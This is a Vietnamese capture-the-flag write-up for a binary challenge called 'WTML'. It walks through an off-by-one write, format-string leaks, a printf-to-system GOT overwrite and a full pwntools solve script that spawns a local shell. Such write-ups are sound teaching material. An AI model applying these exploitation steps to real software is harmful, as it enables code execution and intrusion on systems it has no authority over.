# WTML
*code khá dài nên mình sẽ không để nó ở đây*
## Analysis
Ta sẽ đi qua một chút về luồng thực thi chính cũng như chức năng của các hàm trong chương trình. Ta sẽ đi từ hàm main:

```c
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    tag_replacer replacer = {
            .funcs = {replace_tag_v1, replace_tag_v2},
            .id = 0,
    };
    char user_message[32] = {0};

    puts("Please enter your WTML!");
    // read 32 byte
    fread(user_message, sizeof(char), 32, stdin);

    while (true) {
        // Replace tag
        char from = 0;
        prompt_tag("What tag would you like to replace [q to quit]?", &from);

        if (from == 'q') {
            exit(0);
        }

            char to = 0;
            prompt_tag("With what new tag?", &to);

        replacer.funcs[replacer.id](user_message, from, to);

        puts(user_message);
    }
}
```
Hàm main sẽ khởi tạo một struct tag_replacer có cấu trúc dạng:

```c
typedef void (*tag_replacer_func)(char *message, char from, char to);

typedef struct tag_replacer {
    uint8_t id;  // uint8_t (kiểu dữ liệu của stdint.h) = char
    tag_replacer_func funcs[2];
} __attribute__((packed)) tag_replacer;
```
với một biến id kiểu char và mảng tag_replacer_func gồm hai phần tử cũng là một kiểu struct được khai báo như trên. Main sẽ set mặc định id = 0 và hai phần tử của tag_replacer_func là hai function replace_tag_v1 và replace_tag_v2.

Đầu tiên, chương trình sẽ bắt ta nhập một chuỗi gọi là 'WTML' có độ lớn **0x20 byte** rồi sau đó là một vòng lặp vô hạn hỏi muốn thay đổi cái tag (là một ký tự trong chuỗi vừa nhập) nào, nhập tiếp tag muốn thay vào, sau đó main sẽ gọi tới `replace_tag_func[id]`. Mà id của ta mặc định là 0 rồi nên tất nhiên sẽ gọi tới replace_tag_v1
```c
void replace_tag_v1(char *message, char from, char to) {
    size_t start_tag_index = -1; 
    for (size_t i = 0; i < 32 -2; i++) {
        if (message[i] == '<' && message[i + 1] == from && message[i + 2] == '>') {
            start_tag_index = i;
            break;
        }
    }
    if (start_tag_index == -1) return;

    for (size_t i = start_tag_index + 3; i < 32; i++) {
        if (message[i] == '<' && message[i + 1] == '/' && message[i + 2] == from) {
            size_t end_tag_index = i;
            message[start_tag_index + 1] = to;
            message[end_tag_index + 2] = to;
            return;
        }
    }
} //như vậy thì nó sẽ có dạng <from>xxxxxxxxxxx</from
```
Trong hàm replace_tag_v1 có 2 điều ta cần để ý: 
- vòng for đầu tiên sẽ kiểm tra chuỗi ta nhập vào có chứa định dạng kiểu `<from>` hay không (from là tag bị thay) nếu tìm thấy các ký tự này thì set start_tag_index chính là vị trí của kí tự `<` và chương trình sẽ tiếp tục do điều kiện if phía dưới không thỏa mãn để kết thúc chương trình
- vòng for thứ 2 chương trình sẽ tìm kiếm định dạng kiểu `</from` từ các kí tự tiếp theo `start_tag_index +3`. Vậy ta có thể hình dung được chuỗi mình nhập vào sẽ có dạng `<from>xxxxxxxxxxx</from`. Nếu tìm thấy các cặp ký tự trên chương trình sẽ set end_tag_index là vị trí của `<` và tiến hành thay đổi.

```c
message[start_tag_index + 1] = to;
message[end_tag_index + 2] = to;
```

Để ý một chút ta sẽ thấy lỗi out of bound ở vòng for này: nếu ký tự `<` của ta nằm ở vị trí thứ 31 vậy thì `message[end_tag_index + 2] = to` sẽ truy cập đến 1 byte trước nó nằm ngoài mảng.

```c
void replace_tag_v2(char *message, char from, char to) {
    printf("[DEBUG] ");
    printf(message); // format string

    // TODO implement

    printf("Please provide feedback about v2: ");
    char response[0x100];
    fgets(response, sizeof(response), stdin);

    printf("Your respones: \"");
    printf(response); // format string

    puts("\" has been noted!");
}
```
Hàm replace_tag_v2 sẽ in ra message của ta rồi xin feedback =)) với độ lớn 0x100 và nó cũng nhận đúng 0x100 nên k có lỗi ở đây. Nhưng ta có thể thấy được 2 bug format string ở trên, hai câu lệnh print bị thiếu mất đặc tả.

Và trong chương trình cũng không có nơi nào để ta tạo shell cả, ta bắt buộc phải tự tạo shell. 
Ngoài ra còn có hàm prompt_tag để lấy các tag from và to, nếu các tag này là các ký tự  < hoặc > hoặc \n thì sẽ exit

```c
void prompt_tag(const char *message, char *tag) {
    puts(message);
    *tag = (char) getchar();

    if (getchar() != '\n' || *tag == '<' || *tag == '>') exit(1);
```
## Exploit
```java
    trungdo@TEFO:$ checksec challenge_patched
    [*] '/mnt/c/ctf/wctf/WTML/challenge_patched'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
Do chall cho cả libc nên tiện tay patch luôn =)). Mà cũng do có libc nên mình nghĩ sẽ tấn công cái nào đấy liên quan. Đầu tiên ta cần phải gọi được hàm replace_tag_v2. Chương trình không có chỗ nào để set id cả. Ta cần tìm nó trong bộ nhớ

```java 
   0x000055555555548d <+97>:    call   0x555555555100 <setvbuf@plt>
   0x0000555555555492 <+102>:   mov    BYTE PTR [rbp-0x20],0x0
   0x0000555555555496 <+106>:   lea    rax,[rip+0xfffffffffffffd6c]        # 0x555555555209 <replace_tag_v1>
   0x000055555555549d <+113>:   mov    QWORD PTR [rbp-0x1f],rax
   0x00005555555554a1 <+117>:   lea    rax,[rip+0xfffffffffffffe7d]        # 0x555555555325 <replace_tag_v2>
   0x00005555555554a8 <+124>:   mov    QWORD PTR [rbp-0x17],rax
   0x00005555555554ac <+128>:   mov    QWORD PTR [rbp-0x40],0x0
   0x00005555555554b4 <+136>:   mov    QWORD PTR [rbp-0x38],0x0
   0x00005555555554bc <+144>:   mov    QWORD PTR [rbp-0x30],0x0
   0x00005555555554c4 <+152>:   mov    QWORD PTR [rbp-0x28],0x0
   0x00005555555554cc <+160>:   lea    rdi,[rip+0xb8b]        # 0x55555555605e
   0x00005555555554d3 <+167>:   call   0x5555555550b0 <puts@plt>
   0x00005555555554d8 <+172>:   mov    rdx,QWORD PTR [rip+0x2051]        # 0x555555557530 <stdin@@GLIBC_2.2.5>
   0x00005555555554df <+179>:   lea    rax,[rbp-0x40]
   0x00005555555554e3 <+183>:   mov    rcx,rdx
   0x00005555555554e6 <+186>:   mov    edx,0x20
   0x00005555555554eb <+191>:   mov    esi,0x1
   0x00005555555554f0 <+196>:   mov    rdi,rax
   0x00005555555554f3 <+199>:   call   0x5555555550c0 <fread@plt>
   ```
Từ đoạn main <+102> là 2 hàm replace_tag được đưa vào mảng replace_tag_func, có lẽ id cũng sẽ nằm quanh đây, lúc đầu mình đoán là rbp - 0x40 nhưng sau đó địa chỉ này lại được gọi bởi hàm fread để chứa input, nên có lẽ rbp - 0x20 mới là địa chỉ của id

```java
gef➤  x/5gx $rbp - 0x40
0x7fffffffe010: 0x4141414141414141      0x4141414141414141
0x7fffffffe020: 0x4141414141414141      0x4141414141414141
0x7fffffffe030: 0x0055555555520900
gef➤  x/x $rbp - 0x20
0x7fffffffe030: 0x0055555555520900
```
replacer.id chính là byte `\x00` sau cùng của chuỗi kia. Hãy nhớ là ta có lỗi out of bound ở replace_tag_v1 và có quyền thay đổi tag, ta sẽ lợi dụng điểm này để overwrite `replacer.id` đang nằm ngay sau `user_message`

```python
payload = b'<\0>'
payload = payload.ljust(30, b"A")
payload += b'</'
```
Đây là payload mình sẽ gửi, ta sẽ để tag muốn thay là \x00 và sẽ thay bằng \x01. Như vậy là có thể overwrite được id thành 1. Rồi từ replace_tag_v2 ta sẽ khai thác lỗi fmt. Khi đã gọi được replace_tag_v2, kiểm tra trong stack có các địa chỉ của binary và libc ở %29 và %53 nên leak luôn và mình định sẽ exploit bằng cách overwrite bảng got
```java

gef➤
...
gef➤
0x00007ffc94b2e5d0│+0x00a0: 0x0000000000000000
0x00007ffc94b2e5d8│+0x00a8: 0x00007f6db15ab980  →  0x00000000fbad208b
0x00007ffc94b2e5e0│+0x00b0: 0x00007f6db15a84a0  →  0x0000000000000000
0x00007ffc94b2e5e8│+0x00b8: 0x000055555a4ed120  →  <_start+0> endbr64
0x00007ffc94b2e5f0│+0x00c0: 0x00007ffc94b2e790  →  0x0000000000000001
...
gef➤
...
gef➤
...
0x00007ffc94b2e6a0│+0x0170: 0x0000000000000000
0x00007ffc94b2e6a8│+0x0178: 0x00007f6db13e3083  →  <__libc_start_main+243> mov edi, eax
0x00007ffc94b2e6b0│+0x0180: 0x00007f6db15e0620  →  0x00050f5a00000000
0x00007ffc94b2e6b8│+0x0188: 0x00007ffc94b2e798  →  0x00007ffc94b2f3c1  →  "/mnt/c/ctf/wctf/WTML/challenge_patched"
```
Ta sửa lại payload một chút 

```python
payload = b'%29$p%53$p'
payload += b'<\0>'
payload = payload.ljust(30, b"A")
payload += b'</'
p = process(exe.path)
p.sendafter(b'WTML!\n', payload)
p.sendlineafter(b'quit]?\n', b"\0")
p.sendlineafter(b'tag?\n', b"\x01")
# round 2
p.sendlineafter(b'quit]?\n', b"A")
p.sendlineafter(b'tag?\n', b"B")

p.recvuntil(b'[DEBUG] ')
exe_leak = int(p.recv(14),16)
libc_leak = int(p.recv(14),16)
libc.address = libc_leak - 147587
log.info('libc_base :'+ hex(libc.address))
exe.address = exe_leak - 4384
log.info('exe_base :'+ hex(exe.address))
```
```java
[*] libc_leak :0x7fa9f2cb0083
[*] exe_leak :0x55a799200120
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000055a7991ff000 0x000055a799200000 0x0000000000000000 r-- /mnt/c/ctf/wctf/WTML/challenge_patched
0x000055a799200000 0x000055a799201000 0x0000000000001000 r-x /mnt/c/ctf/wctf/WTML/challenge_patched
0x000055a799201000 0x000055a799202000 0x0000000000002000 r-- /mnt/c/ctf/wctf/WTML/challenge_patched
0x000055a799202000 0x000055a799203000 0x0000000000002000 rw- /mnt/c/ctf/wctf/WTML/challenge_patched
0x000055a799203000 0x000055a799204000 0x0000000000004000 rw- /mnt/c/ctf/wctf/WTML/challenge_patched
0x000055a79a417000 0x000055a79a438000 0x0000000000000000 rw- [heap]
0x00007fa9f2c8c000 0x00007fa9f2cae000 0x0000000000000000 r-- /mnt/c/ctf/wctf/WTML/libc-2.31.so
0x00007fa9f2cae000 0x00007fa9f2e26000 0x0000000000022000 r-x /mnt/c/ctf/wctf/WTML/libc-2.31.so
0x00007fa9f2e26000 0x00007fa9f2e74000 0x000000000019a000 r-- /mnt/c/ctf/wctf/WTML/libc-2.31.so
0x00007fa9f2e74000 0x00007fa9f2e78000 0x00000000001e7000 r-- /mnt/c/ctf/wctf/WTML/libc-2.31.so
0x00007fa9f2e78000 0x00007fa9f2e7a000 0x00000000001eb000 rw- /mnt/c/ctf/wctf/WTML/libc-2.31.so
0x00007fa9f2e7a000 0x00007fa9f2e80000 0x0000000000000000 rw-
0x00007fa9f2e80000 0x00007fa9f2e81000 0x0000000000000000 r-- /mnt/c/ctf/wctf/WTML/ld-2.31.so
0x00007fa9f2e81000 0x00007fa9f2ea4000 0x0000000000001000 r-x /mnt/c/ctf/wctf/WTML/ld-2.31.so
0x00007fa9f2ea4000 0x00007fa9f2eac000 0x0000000000024000 r-- /mnt/c/ctf/wctf/WTML/ld-2.31.so
0x00007fa9f2ead000 0x00007fa9f2eae000 0x000000000002c000 r-- /mnt/c/ctf/wctf/WTML/ld-2.31.so
0x00007fa9f2eae000 0x00007fa9f2eaf000 0x000000000002d000 rw- /mnt/c/ctf/wctf/WTML/ld-2.31.so
0x00007fa9f2eaf000 0x00007fa9f2eb0000 0x0000000000000000 rw-
0x00007ffd947b3000 0x00007ffd947d4000 0x0000000000000000 rw- [stack]
0x00007ffd947dc000 0x00007ffd947e0000 0x0000000000000000 r-- [vvar]
0x00007ffd947e0000 0x00007ffd947e2000 0x0000000000000000 r-x [vdso]
gef➤  p/x 0x55a799200120 - 0x000055a7991ff000
$1 = 0x1120
gef➤  p/x 0x7fa9f2cb0083 - 0x00007fa9f2c8c000
$2 = 0x24083
```

Vậy là ta đã có địa chỉ base của libc và binary giờ chỉ còn tạo shell nữa là xong. Lúc đầu mình định overwrite got của puts nhưng nhận ra là ta không thể điều khiển được rdi do PIE đang được bật, nhưng hàm printf thì có. Do args của nó sẽ là input mình nhập vào. 
```java
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x000055a799200570  →  <__libc_csu_init+0> endbr64
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x00007ffd947d1720  →  0x0000004100000042 ("B"?)
$rbp   : 0x00007ffd947d1830  →  0x00007ffd947d1890  →  0x0000000000000000
$rsi   : 0x00007ffd947cf080  →  "Your respones: "eedback about v2: AAAAAAAAAAAAAA</[...]"
$rdi   : 0x00007ffd947d1730  →  0x00000a6f6c6c6568 ("hello\n"?) <=================================================
$rip   : 0x000055a7992003be  →  <replace_tag_v2+153> call 0x55a7992000d0 <printf@plt>
$r8    : 0x10
$r9    : 0x10
$r10   : 0x000055a79920103b  →  "Your respones: ""
$r11   : 0x246
$r12   : 0x000055a799200120  →  <_start+0> endbr64
$r13   : 0x00007ffd947d1980  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
```
Ta sẽ dùng cái này để đưa chuỗi /bin/sh vào và chạy hàm system nhờ printf.

```java
gef➤  got

GOT protection: No RelRO | GOT functions: 7

[0x55a799202498] puts@GLIBC_2.2.5  →  0x7fa9f2d10420
[0x55a7992024a0] fread@GLIBC_2.2.5  →  0x7fa9f2d0ee60
[0x55a7992024a8] printf@GLIBC_2.2.5  →  0x7fa9f2cedc90
[0x55a7992024b0] fgets@GLIBC_2.2.5  →  0x7fa9f2d0e630
[0x55a7992024b8] getchar@GLIBC_2.2.5  →  0x7fa9f2d17560
[0x55a7992024c0] setvbuf@GLIBC_2.2.5  →  0x7fa9f2d10ce0
[0x55a7992024c8] exit@GLIBC_2.2.5  →  0x7fa9f2cd2a40
gef➤  p system
$3 = {int (const char *)} 0x7fa9f2cde290 <__libc_system>
```
Do system và printf chỉ khác nhau byte thứ 4 và 5 nên ta chỉ cần overwrite phần đấy thôi là đủ.

```python
# overwrite got
system = libc.sym['system'] >> 8 & 0xffff # lấy địa chỉ hàm system, dịch 8 bit rồi lấy 2 byte sau cùng
payload = f'%{system}c%10$hn'.encode()
payload = payload.ljust(16, b"A") # pad để cho stack không bị lẻ
payload += p64(exe.got['printf']+1) # +1 để byte sau cùng không bị overwrite
p.sendlineafter(b'v2: ', payload)
```
Bởi vì địa chỉ got thì nó nằm trên vùng nhớ của binary (có đầu 5) mà libc lại nằm ở vùng nhớ khác nên mình phải leak cả 2 cái ra là vậy.

```java
gef➤  got

GOT protection: No RelRO | GOT functions: 7

[0x5652a69dc498] puts@GLIBC_2.2.5  →  0x7f90f9847420
[0x5652a69dc4a0] fread@GLIBC_2.2.5  →  0x7f90f9845e60
[0x5652a69dc4a8] printf@GLIBC_2.2.5  →  0x7f90f9815290
[0x5652a69dc4b0] fgets@GLIBC_2.2.5  →  0x7f90f9845630
[0x5652a69dc4b8] getchar@GLIBC_2.2.5  →  0x7f90f984e560
[0x5652a69dc4c0] setvbuf@GLIBC_2.2.5  →  0x7f90f9847ce0
[0x5652a69dc4c8] exit@GLIBC_2.2.5  →  0x7f90f9809a40
gef➤  p system
$5 = {int (const char *)} 0x7f90f9815290 <__libc_system>
```
Ta đã overwrite thành công, bước cuối là gửi chuỗi /bin/sh là ta tạo shell thành công
```python
p.sendlineafter(b'quit]?\n', b"B")
p.sendlineafter(b'tag?\n', b"A")
p.sendlineafter(b'v2: \n',b'/bin/sh\0')
```
Đến đây thì k hiểu sao chương trình của mình lại bị treo. Khả năng cao là do khi ta đã overwrite hàm printf thành system rồi nhưng nó lại nhận các tham số không hợp lệ thành ra bị treo. Phải gửi được chuỗi /bin/sh hoặc là sẽ phải overwrite printf thành system tại round 3. 

```java
[DEBUG] Received 0x23 bytes:
    00000000  73 68 3a 20  31 3a 20 63  61 6e 6e 6f  74 20 6f 70  │sh: │1: c│anno│t op│
    00000010  65 6e 20 01  3a 20 4e 6f  20 73 75 63  68 20 66 69  │en ·│: No│ suc│h fi│
    00000020  6c 65 0a                                            │le·│
    00000023
sh: 1: cannot open : No such file
[DEBUG] Received 0x19 bytes:
    b'sh: 1: %29%53: not found\n'
sh: 1: %29%53: not found
[DEBUG] Received 0x19 bytes:
    b'sh: 1: Please: not found\n'
sh: 1: Please: not found
[DEBUG] Received 0x30 bytes:
    b'sh: 1: Syntax error: Unterminated quoted string\n'
sh: 1: Syntax error: Unterminated quoted string
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x76 bytes:
    b'Dockerfile  challenge.c        ld-2.31.so    libc.so.6\twtml.zip\n'
    b'challenge   challenge_patched  libc-2.31.so  solve.py\n'
Dockerfile  challenge.c        ld-2.31.so    libc.so.6    wtml.zip
challenge   challenge_patched  libc-2.31.so  solve.py
$
```
Đấy =)) lỗi syntax error đấy, do mấy cái chuỗi k hợp lệ rồi, nhưng mà dù sao cũng đã tạo được shell =))

**full script :**
```python
from pwn import *
exe = ELF('./challenge_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
payload = b'%29$p%53$p'
payload += b'<\0>'
payload = payload.ljust(30, b"A")
payload += b'</'

p = process(exe.path)
input()
# round 1
p.sendafter(b'WTML!\n', payload)
p.sendlineafter(b'quit]?\n', b"\0")
p.sendlineafter(b'tag?\n', b"\x01")
# round 2
p.recvuntil(b'</\x01')
Unknow_leak = u64(p.recv(6)+ b'\0\0')
log.info('leak :' + hex(Unknow_leak))
p.sendlineafter(b'quit]?\n', b"A")
p.sendlineafter(b'tag?\n', b"B")

p.recvuntil(b'[DEBUG] ')
exe_leak = int(p.recv(14),16)
libc_leak = int(p.recv(14),16)
log.info('libc_leak :' + hex(libc_leak))
libc.address = libc_leak - 147587
log.info('libc_base :'+ hex(libc.address))
log.info('exe_leak :' + hex(exe_leak))
exe.address = exe_leak - 4384
log.info('exe_base :'+ hex(exe.address))

# overwrite got
system = libc.sym['system'] >> 8 & 0xffff
payload = f'%{system}c%10$hn'.encode()
payload = payload.ljust(16, b"A")
payload += p64(exe.got['printf']+1)
p.sendlineafter(b'v2: ', payload)
# round 3
p.sendlineafter(b'quit]?\n', b"B")
p.sendlineafter(b'tag?\n', b"A")
p.sendline(b'/bin/sh\0')

p.interactive()
```